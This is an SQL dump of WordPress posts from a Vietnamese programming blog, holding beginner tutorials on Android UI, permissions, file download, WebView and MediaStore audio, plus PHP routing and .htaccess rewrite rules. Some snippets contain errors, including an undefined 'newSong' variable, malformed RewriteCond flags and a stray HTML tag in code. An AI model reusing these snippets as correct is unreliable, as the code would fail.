(382, 1, '2020-06-27 15:44:41', '2020-06-27 15:44:41', '* Tạo thư mục: app/res/layout/<strong>menu</strong>\n\n<h2>1. Menu ActionBar</h2>\n<h3>1.1. Tạo menu_action_bar.xml</h3>\n- Trong thư mục menu, tạo file: menu_action_bar.xml\n- Trong menu, có các item tương ứng như: item_search, ...\n<pre>\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<menu \n    xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:app=\"http://schemas.android.com/apk/res-auto\">\n\n    <item\n        android:id=\"@+id/item_search\"\n        android:icon=\"@android:drawable/ic_menu_search\"\n        app:showAsAction=\"ifRoom|collapseActionView\"\n        android:title=\"Search\"\n        app:actionViewClass=\"android.widget.SearchView\" />\n</menu>\n</pre>\n\n<h2>1.2. Search ActionBar</h2>\n- Trong MainActivity, Override phương thức: <strong>onCreateOptionsMenu</strong>\n<pre>\npublic boolean onCreateOptionsMenu(Menu menu) {\n    getMenuInflater().inflate(R.menu.menu_action_bar,menu);\n    MenuItem menuItem = menu.findItem(R.id.item_search);\n    SearchView searchView = (SearchView) menuItem.getActionView();\n    searchView.setOnQueryTextListener(new SearchView.OnQueryTextListener() {\n        @Override\n        public boolean onQueryTextSubmit(String s) {\n            Toast.makeText(MainActivity.this, s, Toast.LENGTH_SHORT).show();\n            return false;\n        }\n\n        @Override\n        public boolean onQueryTextChange(String s) {\n            return false;\n        }\n    });\n\n    return super.onCreateOptionsMenu(menu);\n}\n</pre>\n\n<h2>2. Menu Popup</h2>\n<h3>2.1. Tạo menu_action_bar.xml</h3>\n- Trong thư mục menu, tạo file: menu_popup.xml\n- Trong menu, có các item tương ứng như: item, ...\n<pre>\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<menu xmlns:android=\"http://schemas.android.com/apk/res/android\">\n    <item\n        android:id=\"@+id/item_add\"\n        android:title=\"Thêm\"/>\n    <item\n        android:id=\"@+id/item_remove\"\n        android:title=\"Xóa\"/>\n</menu>\n</pre>\n\n<h3>2.2. Tạo sự kiện MenuPopup</h3>\n', 'Layout - Menu', '', 'publish', 'open', 'open', '', 'layout-menu', '', '', '2020-06-27 15:44:41', '2020-06-27 15:44:41', '', 0, 'https://duycode.com/?p=382', 0, 'post', '', 0),
(389, 1, '2020-06-30 22:25:40', '2020-06-30 22:25:40', '<h2>1. Khai báo quyền ở AndroidManifest.xml</h2>\n<pre>\n<uses-permission android:name=\"android.permission.INTERNET\"/>\n<uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\"/>\n<uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/>\n\n<application\n    .......\n    //android>=10 cần khai báo thêm:\n    android:requestLegacyExternalStorage=\"true\"\n    <activity android:name=\".MainActivity\">\n        <intent-filter>\n            <action android:name=\"android.intent.action.MAIN\" />\n\n            <category android:name=\"android.intent.category.LAUNCHER\" />\n        </intent-filter>\n    </activity>\n</application>\n</pre>\n\n<h2>2. Yêu cầu xin quyền khi chạy</h2>\n<pre>\n//1. Tạo mảng các quyền cần xin\nprivate String[] PERMISSION = {\n        Manifest.permission.READ_EXTERNAL_STORAGE,\n        Manifest.permission.WRITE_EXTERNAL_STORAGE\n};\n\n//2. Tạo hàm check các quyền đã được cấp chưa.\n//PackageManager.PERMISSION_GRANTED: ứng với đã được cấp quyền\n//PackageManager.PERMISSION_DENIED: ứng với chưa được cấp quyền\nprivate boolean checkPermission(){\n    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {\n        for (String p:PERMISSION){\n            int status = checkSelfPermission(p);\n            if (status == PackageManager.PERMISSION_DENIED){\n                return false;\n            }\n        }\n    }\n    return true;\n}\n\n//3. Tạo hàm yêu cầu người dùng cấp quyền\nprivate void requestPermission(){\n    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M){\n        requestPermissions(PERMISSION, 0);\n    }\n}\n\n//4. Tạo hàm trả về kết quả sau khi người dùng xác nhận\n@Override\npublic void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {\n    super.onRequestPermissionsResult(requestCode, permissions, grantResults);\n    if (checkPermission()){\n        initViews();\n    }\n    else {\n        finish();\n    }\n}\n</pre>\n\n<h2>3. Sử dụng khi chạy</h2>\n<pre>\n@Override\nprotected void onCreate(Bundle savedInstanceState) {\n    super.onCreate(savedInstanceState);\n    setContentView(R.layout.activity_main);\n\n    if (checkPermission()){\n        initViews();\n    }\n    else {\n        requestPermission();\n    }\n}\n\nprivate void initViews() {\n    //Code của bạn tại đây\n}\n</pre>', 'Uses Permission', '', 'publish', 'open', 'open', '', 'uses-permission', '', '', '2020-06-30 22:25:40', '2020-06-30 22:25:40', '', 0, 'https://duycode.com/?p=389', 0, 'post', '', 0),
(395, 1, '2020-06-30 22:53:21', '2020-06-30 22:53:21', '<h2>1. Khai báo quyền ở AndroidManifest.xml</h2>\n-- Khai báo quyền ở AndroidManifest.xml\n-- Xin cấp quyền trước khi sử dụng\n-- Xem tại đây: <a href=\"/android/uses-permission/\" rel=\"noopener noreferrer\" target=\"_blank\">/android/uses-permission/</a>\n\n<h2>2. Tạo Class: FileDownloadManager</h2>\n<pre>\nimport android.os.Environment;\n\nimport java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.InputStream;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic class FileDownloadManager {\n    public static String download(String link) {\n        try{\n            String path = Environment.getExternalStorageDirectory().getPath();\n            path += \"/Buoi11/\" + System.currentTimeMillis() + \".html\";\n            URL url = new URL(link);\n            URLConnection connection = url.openConnection();\n            InputStream inputStream = connection.getInputStream();\n            byte[] b = new byte[1024];\n            int count = inputStream.read(b);\n\n            File f = new File(path);\n            f.getParentFile().mkdirs();\n            f.createNewFile();\n\n            FileOutputStream fileOutputStream = new FileOutputStream(f);\n            while (count>0){\n                fileOutputStream.write(b,0,count);\n                count = inputStream.read(b);\n            }\n            inputStream.close();\n            fileOutputStream.close();\n\n            return path;\n        }\n        catch (Exception ex){\n            ex.printStackTrace();\n            return null;\n        }\n    }\n}\n</pre>\n\n<h2>3. Sử dụng: MainActivity</h2>\n<pre>\nprivate static final int WHAT_FINISH_DOWNLOAD = 1;\n@Override\nprotected void onCreate(Bundle savedInstanceState) {\n    super.onCreate(savedInstanceState);\n    setContentView(R.layout.activity_main);\n\n    initViews();\n}\n\nprivate void initViews() {\n    btnDownload = findViewById(R.id.btn_download);\n    btnDownload.setOnClickListener(this);\n    btnDownload.setOnClickListener(new View.OnClickListener() {\n        @Override\n        public void onClick(View view) {\n            startDownload();\n        }   \n    });\n}\n\nprivate void startDownload() {\n    Thread download = new Thread(new Runnable() {\n        @Override\n        public void run() {\n            String link = \"https://www.google.com/\";\n            String path = FileDownloadManager.download(link);\n            Message msg = new Message();\n            msg.what = WHAT_FINISH_DOWNLOAD;\n            msg.obj = path;\n            handler.sendMessage(msg);\n        }\n    });\n    download.start();\n}\n\nprivate Handler handler = new Handler() {\n    @Override\n    public void handleMessage(@NonNull Message msg) {\n        super.handleMessage(msg);\n        if (msg.what == WHAT_FINISH_DOWNLOAD) {\n            String path = msg.obj.toString();\n\n            Toast.makeText(MainActivity.this, path, Toast.LENGTH_SHORT).show();\n            btnDownload.setEnabled(true);\n        }\n    }\n};\n</h2>\n</pre>', 'Download File Online', '', 'publish', 'open', 'open', '', 'download-file-online', '', '', '2020-06-30 22:53:21', '2020-06-30 22:53:21', '', 0, 'https://duycode.com/?p=395', 0, 'post', '', 0),
(399, 1, '2020-06-30 23:23:00', '2020-06-30 23:23:00', '<h2>1. Cấp quyền Internet cho ứng dụng</h2>\n<pre>\n<uses-permission android:name=\"android.permission.INTERNET\"/>\n</pre>\n\n<h2>2. Tạo Layout: activity_web_view.xml</h2>\n<pre>\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n    xmlns:tools=\"http://schemas.android.com/tools\"\n    android:orientation=\"vertical\"\n    android:layout_width=\"match_parent\"\n    android:layout_height=\"match_parent\"\n    tools:context=\".WebViewActivity\">\n\n    <WebView\n        android:id=\"@+id/web_view\"\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"match_parent\"/>\n\n</LinearLayout>\n</pre>\n\n<h2>3. Tạo Class: WebViewActivity</h2>\n<pre>\nimport androidx.appcompat.app.AppCompatActivity;\n\nimport android.content.Intent;\nimport android.os.Bundle;\nimport android.webkit.WebView;\nimport android.webkit.WebViewClient;\n\npublic class WebViewActivity extends AppCompatActivity {\n    private WebView webView;\n    private String newsURL;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        this.getSupportActionBar().hide();\n        setContentView(R.layout.activity_web_view);\n\n        Intent intent = getIntent();\n        newsURL = intent.getStringExtra(\"EXTRA_URL_LINK\");\n        initView();\n    }\n\n    private void initView() {\n        webView = findViewById(R.id.web_view);\n        webView.setWebViewClient(new WebViewClient());\n        webView.loadUrl(newsURL);\n    }\n\n    @Override\n    public void onBackPressed() {\n        if (webView.canGoBack()){\n            webView.goBack();\n        }\n        else {\n            super.onBackPressed();\n        }\n    }\n}\n</pre>\n\n<h2>4. Sử dụng</h2>\n<pre>\nString pathOffline = \"/TestDownload/\" + \"file_name\" + \".html\";\nString linkOffline = \"file:///\"+ pathOffline;\nString linkOnline = \"https://www.google.com/\";\nIntent webViewIntent = new Intent(mainActivity, WebViewActivity.class);\nwebViewIntent.putExtra(\"EXTRA_URL_LINK\", linkOnline);\n//webViewIntent.putExtra(\"EXTRA_URL_LINK\", linkOffline);\nstartActivity(webViewIntent);\n</pre>', 'WebView', '', 'publish', 'open', 'open', '', 'webview', '', '', '2020-06-30 23:23:00', '2020-06-30 23:23:00', '', 0, 'https://duycode.com/?p=399', 0, 'post', '', 0);
INSERT INTO `duycode_posts` (`ID`, `post_author`, `post_date`, `post_date_gmt`, `post_content`, `post_title`, `post_excerpt`, `post_status`, `comment_status`, `ping_status`, `post_password`, `post_name`, `to_ping`, `pinged`, `post_modified`, `post_modified_gmt`, `post_content_filtered`, `post_parent`, `guid`, `menu_order`, `post_type`, `post_mime_type`, `comment_count`) VALUES
(410, 1, '2020-07-01 19:14:05', '2020-07-01 19:14:05', '1. build.grade\n<pre>\ndataBinding {\n    enabled = true\n}\n</pre>\n\n<h2>Tại MainActivity.class</h2>\n<pre>\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        binding = DataBindingUtil.setContentView(this,\n                R.layout.activity_main);\n        //setContentView(R.layout.activity_main);\n        init();\n    }\n</pre>\n\n<h2>Tại FragmentActivity.class</h2>\n<pre>\n    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {\n        frBinding = DataBindingUtil.inflate(\n                inflater,\n                R.layout.fragment_song,\n                container,\n                false);\n        View view = frBinding.getRoot();\n        return view;\n    }\n</pre>\n', 'DataBinding - MVVM', '', 'publish', 'open', 'open', '', 'databinding-mvvm', '', '', '2020-07-01 19:14:05', '2020-07-01 19:14:05', '', 0, 'https://duycode.com/?p=410', 0, 'post', '', 0),
(414, 1, '2020-07-03 20:33:47', '2020-07-03 20:33:47', '-- Giả sử ta cần lấy List Audio từ bộ nhớ máy--\n<h2>1. Tạo Class: Song </h2>\n<pre>\npublic class Song {\n    private String data;\n    private int size;\n    private String title;\n    private int duration;\n    private String artist;\n    private String album;\n    private Bitmap thumbnail;\n\n    // thêm Getter và Setter nhé ...\n}\n</pre>\n<h2>2. Tạo Class: SystemAudio </h2>\n<pre>\npackage com.example.miniaudioplayer.utils;\n\nimport android.content.ContentResolver;\nimport android.content.Context;\nimport android.database.Cursor;\nimport android.provider.MediaStore;\n\nimport com.example.miniaudioplayer.model.Song;\n\nimport java.util.ArrayList;\n\npublic class SystemAudio {\n    private ContentResolver resolver;\n\n    public SystemAudio(Context context) {\n        this.resolver = context.getContentResolver();\n    }\n\n    public ArrayList<Song> getAudioList(){\n        ArrayList<Song> songs = new ArrayList<>();\n        Cursor cursor = resolver.query(\n                MediaStore.Audio.Media.INTERNAL_CONTENT_URI,\n                null,\n                null,\n                null,\n                null\n        );\n        // Một vài URI khác để sử dụng:\n        // ContactsContract.Contacts.CONTENT_URI\n        // Telephony.Sms.CONTENT_URI\n        // CallLog.CONTENT_URI\n        // MediaStore.Audio.Media.EXTERNAL_CONTENT_URI\n        // MediaStore.Audio.Media.INTERNAL_CONTENT_URI\n\n        cursor.moveToFirst();\n\n        int indexData = cursor.getColumnIndex(MediaStore.Audio.AudioColumns.DATA);\n        int indexSize = cursor.getColumnIndex(MediaStore.Audio.AudioColumns.SIZE);\n        int indexTitle = cursor.getColumnIndex(MediaStore.Audio.AudioColumns.TITLE);\n        int indexDuration = cursor.getColumnIndex(MediaStore.Audio.AudioColumns.DURATION);\n        int indexArtist = cursor.getColumnIndex(MediaStore.Audio.AudioColumns.ARTIST);\n        int indexAlbum = cursor.getColumnIndex(MediaStore.Audio.AudioColumns.ALBUM);\n\n        while (cursor.isAfterLast() == false) {\n            // Để xem chi tiết các thuộc tính của Audio, có thể Log ra để nhìn:\n            // for (int i = 0; i < cursor.getColumnCount(); i++) {\n            //    Log.e(cursor.getColumnName(i), cursor.getString(i) + \"\");\n            // }\n            // Log.e(\"=======================\", \"========================= \");\n\n            String data = cursor.getString(indexData);\n            int size = cursor.getInt(indexSize);\n            int duration = cursor.getInt(indexDuration);\n            String title = cursor.getString(indexTitle);\n            String artist = cursor.getString(indexArtist);\n            String album = cursor.getString(indexAlbum);\n            Bitmap thumbnail = takeBitmapFromData(data);\n\n            Song song = new Song();\n            song.setAlbum(album);\n            song.setArtist(artist);\n            song.setData(data);\n            song.setDuration(duration);\n            song.setSize(size);\n            song.setTitle(title);\n            newSong.setThumbnail(thumbnail);\n        \n            songs.add(song);\n            cursor.moveToNext();\n        }\n        cursor.close();\n        return songs;\n    }\n\n    public Bitmap takeBitmapFromData(String linkData){\n        MediaMetadataRetriever mmr = new MediaMetadataRetriever();\n        mmr.setDataSource(linkData);\n        byte [] data = mmr.getEmbeddedPicture();\n        Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);\n        return bitmap;\n    }\n}\n</pre>\n\n<h2>3. Tại MainActivity.class </h2>\n<pre>\n    ArrayList<Song> songs;\n    systemAudio = new SystemAudio(this);\n    songs = systemAudio.getAudioList();\n</pre>', 'Get Audio From INTERNAL_CONTENT_URI', '', 'publish', 'open', 'open', '', 'get-audio-from-internal_content_uri', '', '', '2020-07-03 20:33:47', '2020-07-03 20:33:47', '', 0, 'https://duycode.com/?p=414', 0, 'post', '', 0),
(423, 1, '2020-07-08 10:55:55', '2020-07-08 10:55:55', '', 'Drawer Layout', '', 'publish', 'open', 'open', '', 'drawer-layout', '', '', '2020-07-08 10:55:55', '2020-07-08 10:55:55', '', 0, 'https://duycode.com/?p=423', 0, 'post', '', 0),
(425, 1, '2020-07-10 21:54:28', '2020-07-10 21:54:28', '<h2>1. Tạo Drawable: splash_background.xml</h2>\n- Tạo file: /app/res/drawable/splash_background.xml\n<pre>\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<layer-list\n    xmlns:android=\"http://schemas.android.com/apk/res/android\">\n    <item\n        android:drawable=\"@color/colorPrimary\"/>\n\n    <item\n        android:drawable=\"@mipmap/ic_launcher\"\n        android:gravity=\"center\"/>\n\n</layer-list>\n</pre>\n\n<h2>2. Thêm SplashTheme trong Styles</h2>\n- Sửa file: /app/res/values/styles.xml\n<pre>\n<resources>\n    <!-- Base application theme. -->\n    <style name=\"AppTheme\" parent=\"Theme.AppCompat.Light.DarkActionBar\">\n        <!-- Customize your theme here. -->\n        <item name=\"colorPrimary\">@color/colorPrimary</item>\n        <item name=\"colorPrimaryDark\">@color/colorPrimaryDark</item>\n        <item name=\"colorAccent\">@color/colorAccent</item>\n    </style>\n\n    <style name=\"SplashTheme\" parent=\"Theme.AppCompat.DayNight.NoActionBar\">\n        <item name=\"android:windowBackground\">@drawable/splash_background</item>\n    </style>\n</resources>\n</pre>\n<h2>3. Tạo Activity: SplashScreenActivity</h2>\n<pre>\npackage com.example.musicplayer;\n\nimport androidx.appcompat.app.AppCompatActivity;\n\nimport android.content.Intent;\nimport android.os.Bundle;\nimport android.os.Handler;\n\npublic class SplashScreenActivity extends AppCompatActivity {\n    private int splash_time_out = 500;\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n\n        new Handler().postDelayed(new Runnable() {\n            @Override\n            public void run() {\n                Intent intent = new Intent(SplashScreenActivity.this,MainActivity.class);\n                startActivity(intent);\n                finish();\n            }\n        },splash_time_out);\n\n    }\n}\n</pre>\n\n<h2>4. Dùng SplashScreenActivity làm Activity khởi chạy app </h2>\n- Sửa file: app/manifests/AndroidManifest.xml\n<pre>\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    package=\"com.example.musicplayer\">\n\n    <application\n        android:allowBackup=\"true\"\n        android:icon=\"@mipmap/ic_launcher\"\n        android:label=\"@string/app_name\"\n        android:roundIcon=\"@mipmap/ic_launcher_round\"\n        android:supportsRtl=\"true\"\n        android:theme=\"@style/AppTheme\">\n        <activity\n            android:theme=\"@style/SplashTheme\"\n            android:name=\".SplashScreenActivity\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.MAIN\" />\n                <category android:name=\"android.intent.category.LAUNCHER\" />\n            </intent-filter>\n        </activity>\n        <activity android:name=\".PlayingActivity\" />\n        <activity android:name=\".MainActivity\">\n\n        </activity>\n    </application>\n\n</manifest>\n</pre>\n\n<h2>5. Vấn đề khác</h2>\n- SplashScreen sẽ mượt mà nhất khi chỉ set Theme cho Activity thôi.\n- Nếu muốn SplashScreen có thêm tiến tình như ProgessBar, ... thì tại SplashScreenActivity phải setContentView như bình thường', 'Splash Screen Background', '', 'publish', 'open', 'open', '', 'splash-screen-background', '', '', '2020-07-10 21:54:28', '2020-07-10 21:54:28', '', 0, 'https://duycode.com/?p=425', 0, 'post', '', 0),
(438, 1, '2020-07-13 16:53:10', '2020-07-13 16:53:10', '<h2>1. Media Player</h2>\n<img src=\"https://developer.android.com/images/mediaplayer_state_diagram.gif\" alt=\"Media Player Life Cycle\" />\n<pre>\nMediaPlayer mediaPlayer = MediaPlayer.create(this,R.raw.cho_toi_mot_co_hoi);\nmediaPlayer.start();\n</pre>', 'Media', '', 'publish', 'open', 'open', '', 'media', '', '', '2020-07-13 16:53:10', '2020-07-13 16:53:10', '', 0, 'https://duycode.com/?p=438', 0, 'post', '', 0),
(491, 1, '2020-12-06 01:08:10', '2020-12-06 01:08:10', '<h2>1. Tạo file: controller/route.php</h2>\n<pre>\n<?php\n\nclass Controller\n{\n    public function invoke(){\n        if($_GET[\'route\']== \"\"){\n            $this->home();\n        }elseif($_GET[\'route\']== \'home\'){\n            $this->listing();\n        }elseif($_GET[\'route\']== \'login\'){\n            // khi trỏ vào http://localhost/t1904a_php/?route=login thi sẽ xử lý hàm login\n            $this->login();\n        }else{\n            echo \"404 Not Found\";\n        }\n    }\n\n    public function home(){\n        include_once(\"views/home.php\");\n    }\n\n    public function listing(){\n        include_once (\"views/demo_database.php\");\n    }\n\n    public function login(){\n        include_once(\"views/login.php\");\n    }\n}\n\n$controller = new Controller();\n$controller->invoke();\n\n</pre>\n', 'PHP - Điều hướng website - Route', '', 'publish', 'open', 'open', '', 'php-dieu-huong-website-route', '', '', '2020-12-06 01:08:10', '2020-12-06 01:08:10', '', 0, 'http://duycode.com/?p=491', 0, 'post', '', 0),
(498, 1, '2020-12-06 08:13:43', '2020-12-06 08:13:43', '<h2>1. Kiểm tra cấu hình Apache</h2>\n- .htaccess sẽ chậm hơn httpd.conf. Nếu apache cho phép, nên sử dụng httpd.con thay vì .htaccess\n- Mở file: \\apache\\conf\\httpd.conf\n- Kiểm tra dòng này có hoạt động không\n<blockquote>LoadModule rewrite_module modules/mod_rewrite.so</blockquote>\n-&gt; không có dấu # là ok :D\n\n<h2>2. Code mẫu .htaccess</h2>\n<pre>\nRewriteEngine On\n\nRewriteCond %{REQUEST_FILENAME} !f\nRewriteCond %{REQUEST_FILENAME} !d\n\n#RewriteRule ^ index.php [L,QSA]\n</pre>\n\n# Bật tính năng Rewrite URL\n<code>RewriteEngine On</code>\n\n# Yêu cầu đường dẫn không được có file.\nVD: đường dẫn có file .php như sau sẽ không thỏa mãn: http://localhost/frameworkphp/public/index.php\n<code>RewriteCond %{REQUEST_FILENAME} !-f</code>\n\n# Yêu cầu đường dẫn không được là thư mục có thật.\n<code>RewriteCond %{REQUEST_FILENAME} !-d</code>\n\n# Lệnh RewriteRule: RewriteRule \"duong-dan-ao\" \"duong-dan-that\"\n# Đường dẫn thật là đường dẫn thư mục đặt file .htaccess. Trong php, thường đặt file .htaccess trong yourdomain/public\n# Ví dụ: chuyển mọi đường dẫn đều thêm vào cuối: \"index.php\"\n<code>RewriteRule ^ index.php [L,QSA]</code>\n\n\n#RewriteRule \"duong-dan-ao\" \"duong-dan-that\"\n#Vi du, duong dan ao la: \"index=html\" hoac \"../../abc/123/index.html\"\n#Thi duong dan that la: \"public/index.php\"\n#Tuy nhien \"public/index.html\" -&gt; \"home.php\"\nRewriteRule \"index.html\" \"public/index.php\"\nRewriteRule \"public/index.html\" \"home.php\"\n\n#([0-9]+) tương ứng với biến $1, ([]) tương ứng với biến $2\nRewriteRule \"^user-edit/([0-9]+)$\" \"view/admin/user_edit.php?id=$1\"\nRewriteRule \"^user-edit/([0-9]+)/([])$\" \"view/admin/user_edit.php?id_sp=$1&amp;ten_sp=$2\"\n</pre>\n\n<h2>3. Các ký tự dùng riêng của htacess</h2>\n<table>\n<tbody>\n<tr>\n<td>#</td>\n<td>Bắt đầu ghi ch&uacute;</td>\n</tr>\n<tr>\n<td>[F]</td>\n<td>Forrbidden - chỉ định server trả về&nbsp;client lỗi 403</td>\n</tr>\n<tr>\n<td>[L]</td>\n<td>Last rule - Ấn định rằng bước trước đ&atilde; xong th&igrave; ngừng v&agrave; kh&ocirc;ng tiếp tục lệnh rewrite nữa</td>\n</tr>\n<tr>\n<td>[G]</td>\n<td>Gone - chỉ định server trả về client trang b&aacute;o lỗi kh&ocirc;ng tồn tại</td>\n</tr>\n<tr>\n<td>[NC]</td>\n<td>No case - Chỉ định match k&yacute; tự kh&ocirc;ng ph&acirc;n biệt hoa - thường</td>\n</tr>\n<tr>\n<td>[OR]</td>\n<td>Hoặc</td>\n</tr>\n<tr>\n<td>[QSA]</td>\n<td>&nbsp;Append Query String: gắn chuỗi truy vấn v&agrave;o cuối c&ugrave;ng URL</td>\n</tr>\n<tr>\n<td>-d</td>\n<td>Kiểm tra thư mục c&oacute; tồn tại kh&ocirc;ng.</td>\n</tr>\n<tr>\n<td>-f</td>\n<td>Kiểm tra file c&oacute; tồn tại kh&ocirc;ng.</td>\n</tr>\n<tr>\n<td>-s</td>\n<td>Kiểm tra file c&oacute; kh&aacute;c 0 hay kh&ocirc;ng.</td>\n</tr>\n<tr>\n<td>-l&nbsp;</td>\n<td>Kiểm tra link</td>\n</tr>\n</tbody>\n</table>\n\n<h2>4. Regex trong .htaccess</h2>\n<table>\n<tbody>\n<tr>\n<td>^</td>\n<td>Bắt đầu chuỗi Regex</td>\n</tr>\n<tr>\n<td>$</td>\n<td>Kết th&uacute;c chuỗi Regex V&iacute; dụ: ^&amp; : định nghĩa chuỗi rỗng</td>\n</tr>\n<tr>\n<td>[]</td>\n<td>- Tập hợp c&aacute;c k&yacute; tự trong đ&oacute;.<br />[abc] =&gt; chỉ chấp nhận k&yacute; tự a hoặc b hoặc c<br />[a-e] =&gt; chỉ chấp nhận k&yacute; tự thường từ a đến e, tương tự [abcde]<br />[F-K] =&gt; chỉ chấp nhận k&yacute; tự hoa từ F đến K, tương tự [FGHIJK]<br />[a-zA-Z0-9] =&gt; chấp nhận c&aacute;c chữ c&aacute;i thường, hoa, v&agrave; số</td>\n</tr>\n<tr>\n<td>{}</td>\n<td>- X&aacute;c định chiều d&agrave;i cho chuỗi<br />[A-Z]{8} =&gt;&nbsp;c&aacute;c k&yacute; tự từ A tới Z, d&agrave;i 8 k&yacute; tự<br />[a-z]{5,10} =&gt; c&aacute;c k&yacute; tự từ a tới z, d&agrave;i từ 5 đến 10 k&yacute; tự<br />[0-9]{2,} =&gt; k&yacute; tự số, d&agrave;i &iacute;t nhất 2 k&yacute; tự<br /><br /></td>\n</tr>\n<tr>\n<td>.</td>\n<td>- Bất cứ k&yacute; tự đơn n&agrave;o<br />.{10,20} =&gt; chuỗi k&yacute; tự bất kỳ, d&agrave;i từ 10 đến 20 k&yacute; tự</td>\n</tr>\n<tr>\n<td>+</td>\n<td>- Từ 1 k&yacute; tự trở l&ecirc;n, tương tự {1,}<br />[a-z]+ =&gt; chuỗi c&aacute;c k&yacute; tự chữ c&aacute;i thường, c&oacute; &iacute;t nhất 1 k&yacute; tự</td>\n</tr>\n<tr>\n<td>*</td>\n<td>- C&oacute; 0 hoặc nhiều k&yacute; tự, tương tự {}<br />[A-Z]* =&gt; chuỗi c&aacute;c k&yacute; tự chữ c&aacute;i thường, d&agrave;i từ 0 k&yacute; tự trở l&ecirc;n<br /> .*&nbsp; =&gt; kh&ocirc;ng c&oacute; k&yacute; tự n&agrave;o hoặc nhiều k&yacute; tự bất kỳ.<br /> ^.*$ =&gt; sử dụng match với mọi thứ</td>\n</tr>\n<tr>\n<td>?</td>\n<td>- C&oacute; 0 hoặc 1 k&yacute; tự, tương tự {0,1}<br />[a-z]? =&gt; chuỗi c&aacute;c k&yacute; tự chữ c&aacute;i thường, c&oacute; &iacute;t nhất 1 k&yacute; tự</td>\n</tr>\n<tr>\n<td>[^]</td>\n<td>- Ngược lại với []<br />[^a-z]{5,10} =&gt; chuỗi d&agrave;i từ 5 đến 10 k&yacute; tự, nhưng kh&ocirc;ng c&oacute; cữ c&aacute;i thường từ a-z n&agrave;o<br />[^abc]{} =&gt; so khớp với chuỗi kh&ocirc;ng chứa chữ c&aacute;i a,b v&agrave; c</td>\n</tr>\n<tr>\n<td>()</td>\n<td>- Nh&oacute;m c&aacute;c k&yacute; tự th&agrave;nh 1 nh&oacute;m</td>\n</tr>\n<tr>\n<td>|</td>\n<td>- Hoặc<br />(a|b) =&gt; k&yacute; tự a hoặc b<br />(duycode|htaccess) =&gt; chuỗi duycode hoặc htaccess</td>\n</tr>\n<tr>\n<td>\\</td>\n<td>- D&ugrave;ng để đặt trước c&aacute;c k&yacute; tự đặc biệt<br />\\\\ =&gt; k&yacute; tự \\<br />\\. =&gt; k&yacute; tự .</td>\n</tr>\n<tr>\n<td>!</td>\n<td>Phủ định</td>\n</tr>\n</tbody>\n</table>\n\n<h2>5. Những lỗi do file htaccess thường gặp</h2>\n<blockquote>301 - Moved Permanently: 302 - Moved Temporarily: Lỗi truy cập vào trang đã bị di chuyển.\n400 – Bad request (Lỗi request)\n401 – Authorization Required (lỗi xác thực user,password)\n403 – Forbidden (không được vào, trang bị cấm)\n404 – Wrong page (lỗi trang, không tìm thấy…)\n500 – Internal Server Error (lỗi server)</blockquote>\n\n<h2>6. Function PHP sửa URL</h2>\n- Ta có đường dẫn: https://duycode.com/Hãy Cho Tôi Năm Nghìn\n- Chuyển thành: https://duycode.com/hay-cho-toi-nam-nghin\n<pre>function makeURL($string){\n    $string=trim($string);\n    $string=str_replace(\' \',\'-\',$string);\n    $string=strtolower($string);\n    $string=preg_replace(\'/(ù|ú|ủ|ũ|ụ|ư|ừ|ứ|ử|ữ|ự)/\',\'u\',$string);\n    $string=preg_replace(\'/(è|é|ẻ|ẽ|ẹ|ê|ề|ế|ể|ễ|ệ)/\',\'e\',$string);\n    $string=preg_replace(\'/(ò|ó|ỏ|õ|ọ|ô|ồ|ố|ổ|ỗ|ộ|ơ|ờ|ớ|ở|ỡ|ợ)/\',\'o\',$string);\n    $string=preg_replace(\'/(à|á|ả|ã|ạ|ă|ằ|ắ|ẳ|ẵ|ặ|â|ầ|ấ|ẩ|ẫ|ậ)/\',\'a\',$string);\n    $string=preg_replace(\'/(ì|í|ỉ|ĩ|ị)/\',\'i\',$string);\n    $string=preg_replace(\'/đ/\',\'d\',$string);\n    return $string;\n}\n</pre>', 'htaccess toàn tập', '', 'publish', 'open', 'open', '', 'htaccess-toan-tap', '', '', '2020-12-06 08:13:43', '2020-12-06 08:13:43', '', 0, 'http://duycode.com/?p=498', 0, 'post', '', 0),
